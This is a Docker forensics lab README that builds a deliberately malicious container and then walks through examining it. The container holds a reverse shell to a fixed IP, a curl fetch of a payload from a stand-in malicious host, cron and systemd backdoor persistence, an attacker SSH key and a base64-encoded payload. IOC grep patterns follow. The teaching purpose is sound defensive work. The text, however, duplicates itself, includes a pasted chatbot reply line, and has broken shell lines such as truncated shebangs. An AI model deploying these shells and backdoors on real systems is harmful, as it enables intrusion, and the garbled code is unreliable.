# 🐳 Docker Complete Forensic Analysis (End-to-End)

## 📦 What is Docker?

Docker is an open-source platform that automates application deployment, scaling, and management using containerization. It allows software to run reliably across different computing environments.

---

## 🚀 Why Use Docker?

- Consistency across dev, test, and production environments  
- Faster development and deployment cycles  
- Lightweight and portable containers  
- Supports microservices architecture

---

## 📘 Key Concepts & Technical Terms

| Term            | Description |
|-----------------|-------------|
| **Container**   | A standalone package with everything needed to run an app |
| **Image**       | Read-only template used to create containers |
| **Dockerfile**  | Instructions to build a Docker image |
| **Docker Hub**  | Cloud-based registry to share Docker images |
| **Volume**      | Persistent storage for containers |
| **Bind Mount**  | Mounts host files/directories inside containers |
| **Network**     | Virtual network connecting Docker containers |
| **Port Binding**| Maps container ports to host ports |
| **Registry**    | Stores and distributes Docker images |

---

## 🧱 Docker Architecture

+-------------------------+
| Docker Client |
+-----------+-------------+
|
+-----------v-------------+
| Docker Daemon |
+-----------+-------------+
|
+-----------v-------------+
| Docker Objects (Images, |
| Containers, Volumes, |
| Networks) |
+-------------------------+

---

## 🔄 Basic Docker Workflow

1. Write a "Dockerfile"
2. Build image from Dockerfile
3. Run container from image
4. Push image to registry (optional)
5. Deploy container on target system

---

## 🔧 Docker Components

# 🖥️ Client

| Command         | Description |
|-----------------|-------------|
| "docker build"  | Build Docker image from a Dockerfile |
| "docker push"   | Push image to Docker registry |
| "docker run"    | Start container from image |

# 💽 Host

| Component  | Explanation |
|------------|-------------|
| **Daemon** | Docker Engine managing containers/images |
| **Images** | Read-only instructions to build containers |
| **Containers** | Running instances of images |

# 🌐 Registry

| Component   | Explanation |
|-------------|-------------|
| **Repo**    | Group of related Docker images |
| **Notary**  | Image signing for trust verification |

---

## 🆚 Docker vs VMware: Key Differences

| Feature           | Docker (Containers)        | VMware (VMs)               |
|-------------------|----------------------------|----------------------------|
| Type              | OS-level virtualization     | Hardware-level virtualization |
| Boot Time         | Seconds                     | Minutes                    |
| Resource Usage    | Lightweight                 | Heavy (includes full OS)  |
| OS Dependency     | Same OS family              | Different OS possible      |
| Performance       | Near-native                 | Slightly reduced           |
| Portability       | Highly portable             | Less portable              |
| Use Case          | Microservices, CI/CD        | Legacy apps, multi-OS testing |
| Image Format      | Docker Image                | VMDK, VHD                  |

---

## 🔐 Why Forensics in Docker?

# Minimal Visibility

- Containers may evade traditional host-level monitoring.
- Temporary containers can erase forensic traces on shutdown.

# Container Breakouts

- **CVE-2016-5195 (Dirty COW)** – Kernel privilege escalation  
- **CVE-2017-5123** – Memory corruption, container escape  
- **CVE-2014-9357** – Docker CLI command injection  

# Persistence & Lateral Movement

- Use of Docker socket ("/var/run/docker.sock")
- Shared networks and volumes to pivot or extract secrets

# Source Poisoning & Supply Chain Attacks

- Malicious Docker images on public registries  
- E.g., "ubuntu-nginx", "alpine-python" with embedded cryptominers  

# Credential Leaks in Public Repos

- ".env", SSH keys, config files often included in Docker images
- Misconfigured ".dockerignore" leads to sensitive info exposure

---

## 📊 Case Studies

# 1. RWTH Aachen University Study (2023)
- 8.5% of 337,171 Docker images leaked secrets (API keys, SSH keys)
- [📄 Link](https://arxiv.org/abs/2307.03958)

# 2. Sysdig Threat Research (2022)
- 250k+ images with hardcoded secrets and cryptominers
- [📄 Link](https://sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/)

# 3. BleepingComputer Report (2022)
- Over 1,600 malicious Docker Hub images found
- [📄 Link](https://www.bleepingcomputer.com/news/security/docker-hub-repositories-hide-over-1-650-malicious-containers/)

---

## 🧪 Docker Lab Setup

# Dockerfile (Malicious Container)

"Dockerfile
FROM ubuntu:20.04

RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat curl vim wget python3 cron systemctl openssh-server && \
    useradd attacker && echo 'attacker:attacker123' | chpasswd && \
    mkdir -p /home/attacker && chown attacker:attacker /home/attacker

# Malware & reverse shell
RUN echo '#!/bin/\necho "Stealing data..."\ncurl http://malicious.example.com/payload.sh' > /home/attacker/malware.sh && chmod +x /home/attacker/malware.sh
RUN echo '#!/bin/\n -i >& /dev/tcp/192.168.44.129/4444 0>&1' > /home/attacker/revshell.sh && chmod +x /home/attacker/revshell.sh

# Simulated history
RUN echo -e "whoami\nhostname\nifconfig\ncat /etc/passwd\nbase64 /etc/passwd\n./malware.sh\n./revshell.sh" > /home/attacker/._history

# Persistence
RUN echo "* * * * * /home/attacker/revshell.sh" >> /var/spool/cron/crontabs/attacker && chmod 600 /var/spool/cron/crontabs/attacker

# Backdoor service
RUN mkdir -p /etc/systemd/system && \
    echo -e "[Unit]\nDescription=Malicious Backdoor\n[Service]\nExecStart=/home/attacker/revshell.sh\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service

# SSH Key
RUN mkdir -p /home/attacker/.ssh && echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' > /home/attacker/.ssh/authorized_keys && \
    chmod 600 /home/attacker/.ssh/authorized_keys && chown -R attacker:attacker /home/attacker/.ssh

# Encoded Payload
RUN echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoCg==" > /home/attacker/encoded_payload.b64

WORKDIR /home/attacker
USER attacker
CMD ["/home/attacker/revshell.sh"]


Sure! Here's a **clean, well-structured, and comprehensive "README.md"** file that combines both the Docker lab setup and forensic investigation steps into a single, professionally formatted document.

---

"markdown
# 🐳 Docker Complete Forensic Analysis (End-to-End)

## 📦 What is Docker?

Docker is an open-source platform that automates application deployment, scaling, and management using containerization. It allows software to run reliably across different computing environments.

---

## 🚀 Why Use Docker?

- Consistency across dev, test, and production environments  
- Faster development and deployment cycles  
- Lightweight and portable containers  
- Supports microservices architecture

---

## 📘 Key Concepts & Technical Terms

| Term            | Description |
|-----------------|-------------|
| **Container**   | A standalone package with everything needed to run an app |
| **Image**       | Read-only template used to create containers |
| **Dockerfile**  | Instructions to build a Docker image |
| **Docker Hub**  | Cloud-based registry to share Docker images |
| **Volume**      | Persistent storage for containers |
| **Bind Mount**  | Mounts host files/directories inside containers |
| **Network**     | Virtual network connecting Docker containers |
| **Port Binding**| Maps container ports to host ports |
| **Registry**    | Stores and distributes Docker images |

---

## 🧱 Docker Architecture

"

+-------------------------+
\|     Docker Client       |
+-----------+-------------+
|
+-----------v-------------+
\|     Docker Daemon       |
+-----------+-------------+
|
+-----------v-------------+
\| Docker Objects (Images, |
\| Containers, Volumes,    |
\| Networks)               |
+-------------------------+



---

## 🔄 Basic Docker Workflow

1. Write a "Dockerfile"
2. Build image from Dockerfile
3. Run container from image
4. Push image to registry (optional)
5. Deploy container on target system

---

## 🔧 Docker Components

# 🖥️ Client

| Command         | Description |
|-----------------|-------------|
| "docker build"  | Build Docker image from a Dockerfile |
| "docker push"   | Push image to Docker registry |
| "docker run"    | Start container from image |

# 💽 Host

| Component  | Explanation |
|------------|-------------|
| **Daemon** | Docker Engine managing containers/images |
| **Images** | Read-only instructions to build containers |
| **Containers** | Running instances of images |

# 🌐 Registry

| Component   | Explanation |
|-------------|-------------|
| **Repo**    | Group of related Docker images |
| **Notary**  | Image signing for trust verification |

---

## 🆚 Docker vs VMware: Key Differences

| Feature           | Docker (Containers)        | VMware (VMs)               |
|-------------------|----------------------------|----------------------------|
| Type              | OS-level virtualization     | Hardware-level virtualization |
| Boot Time         | Seconds                     | Minutes                    |
| Resource Usage    | Lightweight                 | Heavy (includes full OS)  |
| OS Dependency     | Same OS family              | Different OS possible      |
| Performance       | Near-native                 | Slightly reduced           |
| Portability       | Highly portable             | Less portable              |
| Use Case          | Microservices, CI/CD        | Legacy apps, multi-OS testing |
| Image Format      | Docker Image                | VMDK, VHD                  |

---

## 🔐 Why Forensics in Docker?

# Minimal Visibility

- Containers may evade traditional host-level monitoring.
- Temporary containers can erase forensic traces on shutdown.

# Container Breakouts

- **CVE-2016-5195 (Dirty COW)** – Kernel privilege escalation  
- **CVE-2017-5123** – Memory corruption, container escape  
- **CVE-2014-9357** – Docker CLI command injection  

# Persistence & Lateral Movement

- Use of Docker socket ("/var/run/docker.sock")
- Shared networks and volumes to pivot or extract secrets

# Source Poisoning & Supply Chain Attacks

- Malicious Docker images on public registries  
- E.g., "ubuntu-nginx", "alpine-python" with embedded cryptominers  

# Credential Leaks in Public Repos

- ".env", SSH keys, config files often included in Docker images
- Misconfigured ".dockerignore" leads to sensitive info exposure

---

## 📊 Case Studies

# 1. RWTH Aachen University Study (2023)
- 8.5% of 337,171 Docker images leaked secrets (API keys, SSH keys)
- [📄 Link](https://arxiv.org/abs/2307.03958)

# 2. Sysdig Threat Research (2022)
- 250k+ images with hardcoded secrets and cryptominers
- [📄 Link](https://sysdig.com/blog/analysis-of-supply-chain-attacks-through-public-docker-images/)

# 3. BleepingComputer Report (2022)
- Over 1,600 malicious Docker Hub images found
- [📄 Link](https://www.bleepingcomputer.com/news/security/docker-hub-repositories-hide-over-1-650-malicious-containers/)

---

## 🧪 Docker Lab Setup

# Dockerfile (Malicious Container)

"Dockerfile
FROM ubuntu:20.04

RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y netcat curl vim wget python3 cron systemctl openssh-server && \
    useradd attacker && echo 'attacker:attacker123' | chpasswd && \
    mkdir -p /home/attacker && chown attacker:attacker /home/attacker

# Malware & reverse shell
RUN echo '#!/bin/\necho "Stealing data..."\ncurl http://malicious.example.com/payload.sh' > /home/attacker/malware.sh && chmod +x /home/attacker/malware.sh
RUN echo '#!/bin/\n -i >& /dev/tcp/192.168.44.129/4444 0>&1' > /home/attacker/revshell.sh && chmod +x /home/attacker/revshell.sh

# Simulated history
RUN echo -e "whoami\nhostname\nifconfig\ncat /etc/passwd\nbase64 /etc/passwd\n./malware.sh\n./revshell.sh" > /home/attacker/._history

# Persistence
RUN echo "* * * * * /home/attacker/revshell.sh" >> /var/spool/cron/crontabs/attacker && chmod 600 /var/spool/cron/crontabs/attacker

# Backdoor service
RUN mkdir -p /etc/systemd/system && \
    echo -e "[Unit]\nDescription=Malicious Backdoor\n[Service]\nExecStart=/home/attacker/revshell.sh\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/backdoor.service

# SSH Key
RUN mkdir -p /home/attacker/.ssh && echo 'ssh-rsa AAAAB3Nza... attacker@evil.com' > /home/attacker/.ssh/authorized_keys && \
    chmod 600 /home/attacker/.ssh/authorized_keys && chown -R attacker:attacker /home/attacker/.ssh

# Encoded Payload
RUN echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLmV4YW1wbGUuY29tL3NoZWxsLnNoCg==" > /home/attacker/encoded_payload.b64

WORKDIR /home/attacker
USER attacker
CMD ["/home/attacker/revshell.sh"]


---

## 🛠️ Lab Execution

# Build Image:

"
sudo docker build -t attacker-lab .
"

# Start Reverse Shell Listener:

"
nc -lvnp 4444
"

# Run Container:

"
sudo docker run --name attacker-lab1 -it attacker-lab
"

# Stop & Remove All Containers:

"
sudo docker rm -f $(sudo docker ps -aq)
"

---

## 📌 Useful Docker Commands (Cheat Sheet)

# Basic Info

"
docker version
docker info
docker ps -a
docker images
"

# Inspect & Logs

"
docker inspect attacker-lab
docker logs attacker-lab
docker diff attacker-lab
docker history attacker-lab --no-trunc
docker exec -it attacker-lab1 /bin/
"

---

## 🕵️‍♂️ Forensic Analysis

# 📁 Export & Inspect Image

"
docker save attacker-lab > attacker-manifest.tar
mkdir attacker-manifest && tar -xvf attacker-manifest.tar -C attacker-manifest/
cat attacker-manifest/manifest.json
"

## 🔍 Extract Layers Script

"
#!/bin/
OCI_DIR="attacker-manifest"
LAYER_DIR="layers"
mkdir -p "$LAYER_DIR" && cd "$OCI_DIR"
layer_digests=$(jq -r '.[0].Layers[]' manifest.json)
layer_num=1

for digest in $layer_digests; do
  clean_digest=$(basename "$digest")
  tarball="blobs/sha256/$clean_digest"
  out_dir="../$LAYER_DIR/layer$layer_num"
  mkdir -p "$out_dir"
  tar -xf "$tarball" -C "$out_dir"
  ((layer_num++))
done

echo "[*] IOC scan in progress..."
for d in ../$LAYER_DIR/*; do
  find "$d" -
"


type f $-name "*cron*" -o -name "*_history*" -o -name "*.sh" -o -name "*.service"$
grep -rE "nc -e| -i|curl|wget|/dev/tcp" "\$d" 2>/dev/null
done



---

# 🗂️ Export Container Filesystem

"
docker export attacker-lab1 > attacker-lab.tar
mkdir extracted_lab && tar -xf attacker-lab.tar -C extracted_lab


# Analyze Key Files

"
cat extracted_lab/home/attacker/._history
cat extracted_lab/home/attacker/malware.sh
cat extracted_lab/home/attacker/revshell.sh
base64 -d extracted_lab/home/attacker/encoded_payload.b64
cat extracted_lab/var/spool/cron/crontabs/attacker
cat extracted_lab/etc/systemd/system/backdoor.service
cat extracted_lab/home/attacker/.ssh/authorized_keys
"

---

## 🧠 Memory Dump & Analysis

# Get PID:

"
docker inspect --format '{{.State.Pid}}' attacker-lab
"

# Dump Memory:

"
sudo gcore -o memdump <PID>
"

# Analyze with Radare2:

"
sudo radare2 -q -c 'iI; iz; afl' memdump.<PID>
"

---

## 🧠 Network Capture (Optional)

# Capture Reverse Shell Traffic:

"
sudo tcpdump -i any port 4444 -w revshell.pcap
wireshark revshell.pcap
"

---

## ✅ Summary

This repository demonstrates:

* How attackers can abuse Docker for persistence, lateral movement, and data exfiltration
* How forensic analysts can extract, analyze, and detect these behaviors using Docker tools,  scripting, and memory/network inspection
  
---
*🔐 Always use secure base images, scan for vulnerabilities, externalize logs, and avoid exposing the Docker socket in production.*
